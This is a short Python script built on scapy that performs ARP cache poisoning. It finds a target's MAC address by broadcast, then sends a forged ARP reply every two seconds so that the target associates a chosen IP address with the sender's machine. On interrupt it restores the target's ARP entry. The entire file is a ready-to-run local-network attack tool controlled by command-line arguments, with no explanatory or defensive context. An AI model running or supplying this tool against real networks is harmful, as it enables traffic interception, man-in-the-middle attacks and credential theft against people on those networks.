import argparse
from scapy.all import *
import time

def spoof(target_address: str, spoof_address: str):
 
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_address),verbose=False,timeout=5)
    if ans:
        mac_address = ans[0][1].hwsrc
        target_profile = (target_address, mac_address)
    else:
        print(f"Target {target_address} is either offline, or not responding to arp pings")
        exit(1)

    arp_poison_ping = ARP(op=2,pdst=target_profile[0],psrc=spoof_address)

    print(f"Spoofing {target_address} as {spoof_address}")
    while True:
        try:
            send(arp_poison_ping,verbose=False)
            time.sleep(2)
        except KeyboardInterrupt:
            print(f"Rearping target {target_profile[0]} to {target_profile[0]} is at {target_profile[1]}")
            rearp_request = ARP(op=2,pdst=target_profile[0],psrc=target_profile[0],hwsrc=target_profile[1])
            send(rearp_request)
            exit(0)
        except scapy.error.Scapy_Exception as error:
            print(f"Error {error} encountered when sending arp poison ping")
            exit(1)



parser = argparse.ArgumentParser()
parser.add_argument("--target_address",type=str,default=None)
parser.add_argument("--spoof_address",type=str,default=None)
args = parser.parse_args()

target_address = args.target_address
spoof_address = args.spoof_address

if target_address is None:
    print("Error: must provide target_address argument")
    exit(1)
elif spoof_address is None:
    print("Error: must provide spoof_address argument")
    exit(1)
else:
    spoof(target_address,spoof_address)
